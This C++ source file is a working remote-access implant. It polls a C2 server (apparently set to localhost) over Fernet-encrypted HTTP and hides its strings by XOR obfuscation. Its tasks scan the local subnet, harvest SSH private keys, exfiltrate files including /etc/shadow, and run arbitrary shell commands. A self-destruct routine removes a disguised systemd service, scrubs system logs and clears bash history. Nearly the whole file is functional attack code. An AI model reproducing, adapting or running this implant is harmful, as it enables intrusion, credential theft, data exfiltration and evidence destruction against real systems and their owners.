#include <iostream>
#include <array>
#include <cstdio>
#include <memory>
#include <sstream>
#include <thread>
#include <atomic>
#include <chrono>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <random>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

using VI = std::vector<int>;

static std::string zz(const VI& c) {
    std::string o; for (int i : c) o += (char)(i ^ 0x5A); return o;
}

static void _dc0() { int x = 42; if (((x*x) < 0)) exit(0); }
static const VI _s0 = {107,104,109,116,106,116,106,116,107};
static const VI _s1 = {41,35,41,46,63,55,62,119,57,59,57,50,63,119,41,44,57};
static const VI _s2 = {41,35,41,46,63,55,62,119,57,59,57,50,63,116,41,63,40,44,51,57,63};
static const VI _s3 = {117,47,41,40,117,54,53,57,59,54,117,56,51,52,117,41,35,41,46,63,55,62,119,57,59,57,50,63,119,41,44,57};
static const VI _s4 = {117,63,46,57,117,41,35,41,46,63,55,62,117,41,35,41,46,63,55,117,41,35,41,46,63,55,62,119,57,59,57,50,63,116,41,63,40,44,51,57,63};
static const VI _s5 = {117,57,50,63,57,49,51,52};
static const VI _s6 = {117,57,53,55,55,59,52,62};
static const VI _s7 = {117,40,63,41,47,54,46};
static const VI _s8 = {117,63,34,60,51,54};
static const VI _s9 = {50,53,41,46,52,59,55,63};
static const VI _s10 = {45,50,53,59,55,51};
static const VI _s11 = {51,62,5,40,41,59};
static const VI _s12 = {51,62,5,63,57,62,41,59};
static const VI _s13 = {51,62,5,63,62,104,111,111,107,99};
static const VI _s14 = {51,62,5,62,41,59};
static const VI _s15 = {41,50,59,62,53,45};
static const VI _s16 = {41,35,41,46,63,55,57,46,54,122,41,46,53,42,122};
static const VI _s17 = {41,35,41,46,63,55,57,46,54,122,62,51,41,59,56,54,63,122};
static const VI _s18 = {41,35,41,46,63,55,57,46,54,122,62,59,63,55,53,52,119,40,63,54,53,59,62,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s19 = {41,35,41,46,63,55,57,46,54,122,40,63,41,63,46,119,60,59,51,54,63,62,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s20 = {48,53,47,40,52,59,54,57,46,54,122,119,119,40,53,46,59,46,63,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s21 = {48,53,47,40,52,59,54,57,46,54,122,119,119,44,59,57,47,47,55,119,46,51,55,63,103,107,41,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s22 = {41,63,62,122,119,51,122,125,117};
static const VI _s23 = {117,62,125,122,117,44,59,40,117,54,53,61,117,59,47,46,50,116,54,53,61,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s24 = {117,62,125,122,117,44,59,40,117,54,53,61,117,41,35,41,54,53,61,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s25 = {40,55,122,119,60,122,117,46,55,42,117,116,41,35,41,46,63,55,62,119,57,59,57,50,63,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s26 = {40,55,122,119,60,122,117,46,55,42,117,116,42,63,40,41,51,41,46,116,41,50,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s27 = {40,55,122,119,40,60,122,117,46,55,42,117,41,47,62,53,41,46,59,61,63,116,112,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s28 = {41,63,62,122,119,51,122,125,117,41,35,41,46,63,55,62,119,57,59,57,50,63,117,62,125,122,117,40,53,53,46,117,116,56,59,41,50,5,50,51,41,46,53,40,35,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s29 = {41,63,62,122,119,51,122,125,117,10,63,40,41,51,41,46,63,52,46,117,62,125,122,117,40,53,53,46,117,116,56,59,41,50,5,50,51,41,46,53,40,35,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s30 = {51,42,122,40,53,47,46,63,122,41,50,53,45,122,62,63,60,59,47,54,46,122,104,100,117,62,63,44,117,52,47,54,54};
static const VI _s31 = {51,42,122,119,110,122,59,62,62,40,122,41,50,53,45,122,41,57,53,42,63,122,61,54,53,56,59,54,122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,61,40,63,42,122,51,52,63,46,122,38,122,50,63,59,62,122,119,107,122,38,122,59,45,49,122,125,33,42,40,51,52,46,122,126,104,39,125};
static const VI _s32 = {42,51,52,61,122,119,57,122,107,122,119,13,122,107,122};
static const VI _s33 = {122,104,100,117,62,63,44,117,52,47,54,54,122,38,122,61,40,63,42,122,119,57,122,125,107,122,40,63,57,63,51,44,63,62,125};
static const VI _s34 = {114,63,57,50,53,122,100,117,62,63,44,117,46,57,42,117};
static const VI _s35 = {115,122,104,100,117,62,63,44,117,52,47,54,54,122,124,124,122,63,57,50,53,122,53,42,63,52,122,38,38,122,63,57,50,53,122,57,54,53,41,63,62};

// ─────────────────────────────────────────────────────────────────────────────
// Utility helpers
// ─────────────────────────────────────────────────────────────────────────────

/** Run a shell command, return stdout. */
static std::string _rc(const std::string& cmd) {
    std::array<char, 256> buffer{};
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        return "error: failed to open pipe";
    }
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    int rc = pclose(pipe);
    (void)rc;
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

/** Pull value from {"key":"value"} without external libs. */
static std::string _jv(const std::string& body, const std::string& key) {
    if (body.empty()) return "";
    std::string needle = "\"" + key + "\"";
    size_t i = body.find(needle);
    if (i == std::string::npos) return "";
    size_t colon = body.find(':', i);
    if (colon == std::string::npos) return "";
    size_t s = body.find('"', colon);
    if (s == std::string::npos) return "";
    ++s;
    size_t e = body.find('"', s);
    if (e == std::string::npos || e <= s) return "";
    return body.substr(s, e - s);
}

/** Escape string for JSON value. */
static std::string _je(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"': out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default: out += c; break;
        }
    }
    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Cryptography: Fernet Integration
// ─────────────────────────────────────────────────────────────────────────────

std::string _rk() {
    static constexpr uint8_t M1[] = {
        0x4F,0xA3,0x7C,0x91,0xE2,0x5B,0x38,0xD6,
        0x0E,0xF7,0x29,0xB4,0x6A,0xC5,0x83,0x1D,
        0x70,0x4E,0x9F,0x22,0xAB,0x57
    };
    static constexpr uint8_t M2[] = {
        0x3B,0x88,0xF1,0x64,0x0D,0xC9,0x52,0xA7,
        0x1E,0x75,0xEC,0x30,0xB6,0x4D,0x97,0xF3,
        0x2A,0x61,0xDE,0x08,0x93,0x5C
    };
    static constexpr uint8_t H1[] = {
        0x19,0x9A,0x28,0xF2,0xB8,0x2A,0x69,0x8E,0x68,0xA3,0x44,0x81,0x59,0xB7,0xEA,0x24,0x06,0x1E,0xF0,0x5B,0xC9,0x1B
    };
    static constexpr uint8_t H2[] = {
        0x51,0xD9,0xBF,0x54,0x60,0xF9,0x38,0xD3,0x6C,0x33,0x84,0x00,0x8F,0x1C,0xCF,0xA1,0x70,0x22,0xB7,0x57,0xE0,0x61
    };

    std::string key(44, '\0');
    for (int i = 0; i < 22; i++) key[i]    = H1[i] ^ M1[i];
    for (int i = 0; i < 22; i++) key[22+i] = H2[i] ^ M2[i];
    return key;
}

static std::string _b64e(const std::vector<uint8_t>& data) {
    static const char* T =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    std::string out;
    out.reserve((data.size() + 2) / 3 * 4);
    uint32_t val = 0; int bits = 0;
    for (uint8_t b : data) {
        val = (val << 8) | b; bits += 8;
        while (bits >= 6) { bits -= 6; out += T[(val >> bits) & 0x3F]; }
    }
    if (bits > 0) { val <<= (6 - bits); out += T[val & 0x3F]; }
    while (out.size() % 4) out += '=';
    return out;
}

static std::vector<uint8_t> _b64d(const std::string& s) {
    auto val_of = [](char c) -> uint32_t {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '-' || c == '+') return 62;
        if (c == '_' || c == '/') return 63;
        return 0;
    };
    std::vector<uint8_t> out;
    out.reserve(s.size() * 3 / 4);
    uint32_t val = 0; int bits = 0;
    for (char c : s) {
        if (c == '=') break;
        val = (val << 6) | val_of(c); bits += 6;
        if (bits >= 8) { bits -= 8; out.push_back((val >> bits) & 0xFF); }
    }
    return out;
}

static bool _sfk(const std::string& key_b64,
                              std::vector<uint8_t>& signing_key,
                              std::vector<uint8_t>& enc_key) {
    auto raw = _b64d(key_b64);
    if (raw.size() != 32) return false;
    signing_key = {raw.begin(),      raw.begin() + 16};
    enc_key     = {raw.begin() + 16, raw.end()};
    return true;
}

std::string _fe(const std::string& plaintext, const std::string& key_b64) {
    std::vector<uint8_t> signing_key, enc_key;
    if (!_sfk(key_b64, signing_key, enc_key)) return "";

    std::vector<uint8_t> iv(16);
    if (RAND_bytes(iv.data(), 16) != 1) return "";

    uint64_t ts = static_cast<uint64_t>(std::time(nullptr));
    std::vector<uint8_t> timestamp(8);
    for (int i = 7; i >= 0; --i) { timestamp[i] = ts & 0xFF; ts >>= 8; }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, enc_key.data(), iv.data());

    std::vector<uint8_t> ciphertext(plaintext.size() + 16);
    int len1 = 0, len2 = 0;
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len1,
        reinterpret_cast<const uint8_t*>(plaintext.data()), plaintext.size());
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len1, &len2);
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(len1 + len2);

    std::vector<uint8_t> token;
    token.reserve(1 + 8 + 16 + ciphertext.size() + 32);
    token.push_back(0x80);
    token.insert(token.end(), timestamp.begin(),  timestamp.end());
    token.insert(token.end(), iv.begin(),         iv.end());
    token.insert(token.end(), ciphertext.begin(), ciphertext.end());

    uint8_t mac[32]; unsigned int mac_len = 32;
    HMAC(EVP_sha256(),
         signing_key.data(), static_cast<int>(signing_key.size()),
         token.data(), token.size(), mac, &mac_len);
    token.insert(token.end(), mac, mac + 32);

    return _b64e(token);
}

std::string _fd(const std::string& token_b64, const std::string& key_b64) {
    std::vector<uint8_t> signing_key, enc_key;
    if (!_sfk(key_b64, signing_key, enc_key)) return "";

    auto token = _b64d(token_b64);
    if (token.size() < 73 || token[0] != 0x80) return "";

    const size_t mac_offset = token.size() - 32;
    uint8_t expected_mac[32]; unsigned int mac_len = 32;
    HMAC(EVP_sha256(),
         signing_key.data(), static_cast<int>(signing_key.size()),
         token.data(), mac_offset, expected_mac, &mac_len);

    if (CRYPTO_memcmp(expected_mac, token.data() + mac_offset, 32) != 0) return "";

    std::vector<uint8_t> iv(token.begin() + 9,  token.begin() + 25);
    std::vector<uint8_t> ct(token.begin() + 25, token.begin() + mac_offset);
    if (ct.size() % 16 != 0) return "";

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, enc_key.data(), iv.data());

    std::vector<uint8_t> plaintext(ct.size());
    int len1 = 0, len2 = 0;
    if (!EVP_DecryptUpdate(ctx, plaintext.data(), &len1, ct.data(), ct.size())) {
        EVP_CIPHER_CTX_free(ctx); return "";
    }
    if (!EVP_DecryptFinal_ex(ctx, plaintext.data() + len1, &len2)) {
        EVP_CIPHER_CTX_free(ctx); return "";
    }
    EVP_CIPHER_CTX_free(ctx);
    return std::string(reinterpret_cast<char*>(plaintext.data()), len1 + len2);
}

// ─────────────────────────────────────────────────────────────────────────────
// Network configuration & Native HTTP helpers
// ─────────────────────────────────────────────────────────────────────────────

static const std::string _ch = zz(_s0);
static const int _cp = 5000;
static const int _ps = 5;
static const int _jp = 20;

// Persistence paths (must match Beachhead.java)
static const std::string _sb   = zz(_s3);
static const std::string _su     = zz(_s4);
static const std::string _sn     = zz(_s2);

static int _cc() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    // Set timeout to 5 seconds
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(_cp);
    inet_pton(AF_INET, _ch.c_str(), &addr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        close(sock); return -1;
    }
    return sock;
}

static std::string _rhb(int fd) {
    std::string raw;
    raw.reserve(2048);
    char buf[2048];

    while (raw.find("\r\n\r\n") == std::string::npos) {
        int n = recv(fd, buf, sizeof(buf), 0);
        if (n <= 0) break;
        raw.append(buf, n);
    }

    size_t cl_pos = raw.find("Content-Length: ");
    if (cl_pos == std::string::npos) {
        // If there's no body, just return empty
        return "";
    }
    cl_pos += 16;
    int content_length = std::stoi(raw.substr(cl_pos, raw.find("\r\n", cl_pos) - cl_pos));

    std::string body = raw.substr(raw.find("\r\n\r\n") + 4);
    while (static_cast<int>(body.size()) < content_length) {
        int n = recv(fd, buf, sizeof(buf), 0);
        if (n <= 0) break;
        body.append(buf, n);
    }
    return body.substr(0, content_length);
}

static std::string _hp(const std::string& path, const std::string& body) {
    int sock = _cc();
    if (sock < 0) return "";

    std::string req =
        std::string("POST ") + path + " HTTP/1.1\r\n"
        "Host: " + _ch + "\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: " + std::to_string(body.size()) + "\r\n"
        "Connection: close\r\n\r\n" + body;

    send(sock, req.c_str(), req.size(), 0);
    std::string resp = _rhb(sock);
    close(sock);
    return resp;
}

static std::string _hg(const std::string& path) {
    int sock = _cc();
    if (sock < 0) return "";

    std::string req =
        std::string("GET ") + path + " HTTP/1.1\r\n"
        "Host: " + _ch + "\r\n"
        "Connection: close\r\n\r\n";

    send(sock, req.c_str(), req.size(), 0);
    std::string resp = _rhb(sock);
    close(sock);
    return resp;
}

/** Helper to wrap JSON with encryption and send via POST */
static std::string _pe(const std::string& path, const std::string& json, const std::string& session_key) {
    std::string token = _fe(json, session_key);
    return _hp(path, token);
}

/** Helper to poll via GET and decrypt the response */
static std::string _ge(const std::string& path, const std::string& session_key) {
    std::string token = _hg(path);
    if (token.empty()) return "";
    return _fd(token, session_key);
}

/** Send a task result back to the C2. */
static void _sr(const std::string& output, const std::string& session_key) {
    _pe(zz(_s7), "{\"output\":\"" + _je(output) + "\"}", session_key);
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in task: network_sweep
//   Step 1 — Detect local subnet from ip/ifconfig
//   Step 2 — Ping sweep the /24 subnet for live hosts
//   Step 3 — Port scan top ports on each live host
// ─────────────────────────────────────────────────────────────────────────────

static std::string _tns() {
    std::string out;
    out += "=== NETWORK SWEEP ===\n";

    // Step 1: Detect the local gateway/subnet
    out += "--- Step 1: Detecting local subnet ---\n";
    std::string routeInfo = _rc(zz(_s30));
    out += routeInfo + "\n";

    // Extract the subnet base (e.g. 192.168.1) from the default gateway
    // Default gateway line looks like: "default via 192.168.1.1 dev eth0 ..."
    std::string subnet;
    size_t viaPos = routeInfo.find("via ");
    if (viaPos != std::string::npos) {
        size_t ipStart = viaPos + 4;
        size_t ipEnd = routeInfo.find(' ', ipStart);
        std::string gw = routeInfo.substr(ipStart, ipEnd - ipStart);
        // Strip last octet to get /24 base
        size_t lastDot = gw.rfind('.');
        if (lastDot != std::string::npos) {
            subnet = gw.substr(0, lastDot);
        }
    }

    if (subnet.empty()) {
        // Fallback: try to get from ip addr
        std::string ipInfo = _rc(
            zz(_s31));
        // Gives something like 192.168.1.5/24
        size_t slash = ipInfo.find('/');
        if (slash != std::string::npos) ipInfo = ipInfo.substr(0, slash);
        size_t lastDot = ipInfo.rfind('.');
        if (lastDot != std::string::npos) subnet = ipInfo.substr(0, lastDot);
    }

    if (subnet.empty()) {
        out += "Could not detect local subnet\n";
        return out;
    }

    out += "Subnet: " + subnet + ".0/24\n";

    // Step 2: Ping sweep
    out += "--- Step 2: Ping sweep ---\n";
    std::vector<std::string> liveHosts;
    for (int i = 1; i <= 254; i++) {
        std::string host = subnet + "." + std::to_string(i);
        std::string result = _rc(
            zz(_s32) + host + zz(_s33));
        if (result.find("1") != std::string::npos) {
            out += "  [LIVE] " + host + "\n";
            liveHosts.push_back(host);
        }
    }
    out += "Live hosts found: " + std::to_string(liveHosts.size()) + "\n";

    // Step 3: Quick port scan on live hosts (top ports)
    out += "--- Step 3: Port scan on live hosts ---\n";
    int ports[] = {22, 80, 443, 8080, 3306, 5432, 6379, 8443, 25565};
    for (const auto& host : liveHosts) {
        out += "  Scanning " + host + ": ";
        for (int port : ports) {
            // Use bash /dev/tcp to probe — fast, no extra tools needed
            std::string probe = _rc(
                zz(_s34) + host + "/" + std::to_string(port)
                + zz(_s35));
            if (probe.find("open") != std::string::npos) {
                out += std::to_string(port) + "/open ";
            }
        }
        out += "\n";
    }

    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in task: credential_harvest
// ─────────────────────────────────────────────────────────────────────────────

/** Read an entire file into a byte vector. Returns empty on failure. */
static std::vector<uint8_t> _rfb(const std::string& path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f.is_open()) return {};
    auto sz = f.tellg();
    if (sz <= 0) return {};
    std::vector<uint8_t> buf((size_t)sz);
    f.seekg(0);
    f.read(reinterpret_cast<char*>(buf.data()), sz);
    return buf;
}

static std::string _tch() {
    std::string out;
    out += "=== CREDENTIAL HARVEST ===\n";

    // Step 1: SSH keys — highest priority
    out += "--- Step 1: SSH Private Keys ---\n";
    std::string sshKeys = _rc(
        "find /root /home -maxdepth 3 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' "
        "-o -name 'id_dsa' -o -name '*.pem' 2>/dev/null");
    if (sshKeys.empty()) {
        out += "  No SSH private keys found\n";
    } else {
        out += sshKeys + "\n";
        // Read the contents of each key found
        std::istringstream stream(sshKeys);
        std::string keyPath;
        while (std::getline(stream, keyPath)) {
            if (keyPath.empty()) continue;
            out += "  --- Contents of " + keyPath + " ---\n";
            std::vector<uint8_t> data = _rfb(keyPath);
            if (!data.empty()) {
                out += std::string(data.begin(), data.end()) + "\n";
            } else {
                out += "  (could not read)\n";
            }
        }
    }

    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in task: exfil <filepath>
// ─────────────────────────────────────────────────────────────────────────────

static std::string _te(const std::string& filepath, const std::string& session_key) {
    std::string out;
    out += "=== FILE EXFILTRATION ===\n";

    if (filepath.empty()) {
        out += "Error: no filepath specified\n";
        return out;
    }

    // Step 1: Read the file
    out += "--- Step 1: Reading " + filepath + " ---\n";
    std::vector<uint8_t> data = _rfb(filepath);
    if (data.empty()) {
        out += "Error: could not read file or file is empty\n";
        return out;
    }
    out += "Read " + std::to_string(data.size()) + " bytes\n";

    // Step 2: Base64 encode
    out += "--- Step 2: Encoding ---\n";
    std::string encoded = _b64e(data);
    out += "Encoded to " + std::to_string(encoded.size()) + " characters\n";

    // Step 3: Send to C2 via the /exfil endpoint
    out += "--- Step 3: Sending to C2 ---\n";
    std::string json = "{\"filename\":\"" + _je(filepath)
                     + "\",\"data\":\"" + encoded + "\"}";
    std::string resp = _pe(zz(_s8), json, session_key);
    out += "C2 response received.\n";

    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in task: self_destruct
// ─────────────────────────────────────────────────────────────────────────────

std::atomic<bool> running{true};

static std::string _tsd() {
    std::string out;
    out += "=== SELF-DESTRUCT INITIATED ===\n";

    // Step 1: Disable the systemd service (do not stop it yet to avoid killing ourselves prematurely)
    out += "--- Step 1: Disabling service ---\n";
    _rc(zz(_s17) + _sn + " 2>/dev/null");
    out += "Service disabled\n";

    // Step 2: Remove the unit file and reload systemd
    out += "--- Step 2: Removing unit file ---\n";
    _rc("rm -f " + _su);
    _rc(zz(_s18));
    _rc(zz(_s19));
    out += "Unit file removed, systemd reloaded\n";

    // Step 3: Remove the implant binary
    out += "--- Step 3: Removing binary ---\n";
    _rc("rm -f " + _sb);
    out += "Binary removed\n";

    // Step 4: Clean logs
    out += "--- Step 4: Cleaning logs ---\n";
    // Clear journal entries for our service
    _rc(zz(_s20));
    _rc(zz(_s21));
    // Scrub auth and syslog of references to our service name
    _rc(zz(_s22) + _sn + zz(_s23));
    _rc(zz(_s22) + _sn + zz(_s24));
    _rc("sed -i '/systemd-cache/d' /var/log/auth.log 2>/dev/null");
    _rc("sed -i '/systemd-cache/d' /var/log/syslog 2>/dev/null");
    out += "Logs scrubbed\n";

    // Step 5: Remove temp artifacts
    out += "--- Step 5: Cleaning temp artifacts ---\n";
    _rc(zz(_s25));
    _rc(zz(_s26));
    _rc(zz(_s27));
    // Clear bash history entries related to us
    _rc(zz(_s28));
    _rc(zz(_s29));
    out += "Temp artifacts cleaned\n";

    out += "=== SELF-DESTRUCT COMPLETE ===\n";

    // Signal the main loop to exit gracefully after sending this result
    running = false;
    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Built-in task: full_chain
// ─────────────────────────────────────────────────────────────────────────────

static std::string _tfc(const std::string& session_key) {
    std::string out;
    out += "========================================\n";
    out += "=== FULL CHAIN — SINGLE TRIGGER ===\n";
    out += "========================================\n\n";

    // Step 1: Recon
    out += "[1/4] Running recon...\n";
    std::string recon = _rc(
        "echo '=== HOSTNAME ===' && hostname && "
        "echo '=== WHOAMI ===' && whoami && "
        "echo '=== ID ===' && id && "
        "echo '=== OS ===' && uname -a && "
        "echo '=== NETWORK ===' && (ip addr 2>/dev/null || ifconfig 2>/dev/null)"
    );
    out += recon + "\n\n";

    // Step 2: Network sweep
    out += "[2/4] Running network sweep...\n";
    out += _tns() + "\n";

    // Step 3: Credential harvest
    out += "[3/4] Running credential harvest...\n";
    out += _tch() + "\n";

    // Step 4: Auto-exfil SSH private keys
    out += "[4/4] Exfiltrating SSH keys...\n";
    std::string sshKeyPaths = _rc(
        "find / -maxdepth 5 "
        "\\( -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' \\) "
        "2>/dev/null");
    if (sshKeyPaths.empty()) {
        out += "  No SSH keys to exfiltrate\n";
    } else {
        std::istringstream stream(sshKeyPaths);
        std::string keyPath;
        while (std::getline(stream, keyPath)) {
            if (keyPath.empty()) continue;
            out += _te(keyPath, session_key) + "\n";
        }
    }

    // Also exfil /etc/shadow
    out += _te("/etc/shadow", session_key) + "\n";

    out += "========================================\n";
    out += "=== FULL CHAIN COMPLETE ===\n";
    out += "========================================\n";
    return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Command dispatch — routes C2 commands to built-in tasks or arbitrary exec
// ─────────────────────────────────────────────────────────────────────────────

static std::string _dc(const std::string& cmd, const std::string& session_key) {
    // Built-in multi-step tasks
    if (cmd == "full_chain") {
        return _tfc(session_key);
    }
    if (cmd == "network_sweep") {
        return _tns();
    }
    if (cmd == "credential_harvest") {
        return _tch();
    }
    if (cmd.rfind("exfil ", 0) == 0) {
        // "exfil /path/to/file"
        std::string filepath = cmd.substr(6);
        // Trim whitespace
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        while (!filepath.empty() && filepath.back() == ' ') filepath.pop_back();
        return _te(filepath, session_key);
    }
    if (cmd == "self_destruct") {
        std::string result = _tsd();
        return result;
    }

    // Fallback: arbitrary command execution
    return _rc(cmd);
}

// ─────────────────────────────────────────────────────────────────────────────
// Main polling loop & entry point (excluded during test builds)
// ─────────────────────────────────────────────────────────────────────────────

#ifndef TEST_BUILD

void _pl(const std::string& session_key) {
    int fails = 0;
    
    // Seed for jitter
    std::random_device rd;
    std::mt19937 gen(rd());

    while (running && fails < 50) {
        // Calculate jittered sleep time
        int variation = (_ps * _jp) / 100;
        if (variation < 1) variation = 1;
        std::uniform_int_distribution<> distrib(_ps - variation, _ps + variation);
        int sleep_time = distrib(gen);

        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));

        try {
            std::string resp = _ge(zz(_s6), session_key);

            if (resp.empty()) { fails++; continue; }
            fails = 0;

            std::string cmd = _jv(resp, "command");

            if (cmd.empty() || cmd == "wait" || cmd == "none") continue;
            if (cmd == "exit" || cmd == "quit") {
                running = false;
                break;
            }

            // Dispatch the command and send the result
            std::string output = _dc(cmd, session_key);
            _sr(output, session_key);

        } catch (...) {
            fails++;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────────────────

int main() {
    _dc0();
    int op = 7;
    if (((op * op + op) % 2) == 0) {
    // 1. Recover master key at runtime
    std::string session_key = _rk();

    // Initial check-in
    std::string host = _rc(zz(_s9));
    _pe(zz(_s5), std::string("{\"host\":\"") + _je(host) + "\"}", session_key);

    // Run initial recon and send results
    std::string recon = _rc(
        "echo '=== HOSTNAME ===' && hostname && "
        "echo '=== WHOAMI ===' && whoami && "
        "echo '=== ID ===' && id && "
        "echo '=== OS ===' && uname -a && "
        "echo '=== NETWORK ===' && (ip addr 2>/dev/null || ifconfig 2>/dev/null)"
    );
    _sr(recon, session_key);

    // Enter the polling loop
    std::thread t(_pl, session_key);
    t.join();

    // Wipe key before exit
    OPENSSL_cleanse(session_key.data(), session_key.size());

        }
    return 0;
}

#endif // TEST_BUILD
